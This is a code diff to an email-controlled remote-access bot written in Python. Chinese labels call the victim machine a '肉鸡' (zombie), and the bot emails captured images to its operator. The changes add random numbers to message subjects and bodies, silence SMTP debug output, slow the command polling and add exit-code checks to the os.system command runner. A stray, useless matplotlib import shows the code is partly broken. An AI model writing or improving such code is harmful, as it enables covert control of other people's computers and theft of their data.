@@ -14,6 +14,7 @@ import json
 import time
 import poplib
 import smtplib
+import random
 from email import encoders
 from email.header import Header
 from email.parser import Parser
@@ -22,6 +23,8 @@ from email.mime.text import MIMEText
 from email.header import decode_header
 from email.utils import parseaddr, formataddr
 from email.mime.multipart import MIMEMultipart
+
+from matplotlib.pyplot import flag
 import zjy_tools
 
 '''邮箱类'''
@@ -82,7 +85,7 @@ class EmailClass:
         msg = MIMEMultipart()
         # SMTP服务器设置并登陆打开连接
         smtp_server = smtplib.SMTP(options['receiver']['smtp_server'], 25)
-        smtp_server.set_debuglevel(1)
+        smtp_server.set_debuglevel(0)
         smtp_server.login(options['receiver']['email'], options['receiver']['password'])
         # 发件人设置
         from_name = '远程肉鸡'
@@ -97,9 +100,9 @@ class EmailClass:
             return False
         # 如果邮件主题和正文为空，那么给出默认的主题和内容
         if subject is None:
-            subject = '肉鸡信息'
+            subject = '肉鸡信息-' + str(random.randint(0, 99999999))
         if content is None:
-            content = '来自肉鸡的全真影像，哈哈！'
+            content = '来自肉鸡的全真影像，哈哈！' + str(random.randint(0, 99999999))
         # 组装邮件主题
         msg['Subject'] = Header(subject)
         # 将邮件正文附上
@@ -190,7 +193,7 @@ class EmailClass:
 class ControlPCbyEmail:
     tool_name = '邮件控制电脑'
 
-    def __init__(self, time_interval=5, **kwargs):
+    def __init__(self, time_interval=30, **kwargs):
         # 如果类初始化时包括了参数，则使用初始化参数，否则读配置文件
         # 虽然也可以通过字典收集参数配置服务器及命令等设置，但强烈建议用配置文件
         if 'options' in kwargs:
@@ -262,8 +265,11 @@ class ControlPCbyEmail:
 
     def run_cmd(self, cmd):
         try:
-            os.system(cmd)
-            print('[INFO]: 运行 <%s> 命令成功...' % cmd)
+            flag = os.system(cmd)
+            if flag == 0:
+                print('[INFO]: 运行 <%s> 命令成功...' % cmd)
+            else:
+                raise RuntimeError('[Error]: 运行 <%s> 命令失败...' % cmd)
             return True
         except:
             print('[Error]: 运行 <%s> 命令失败...' % cmd)
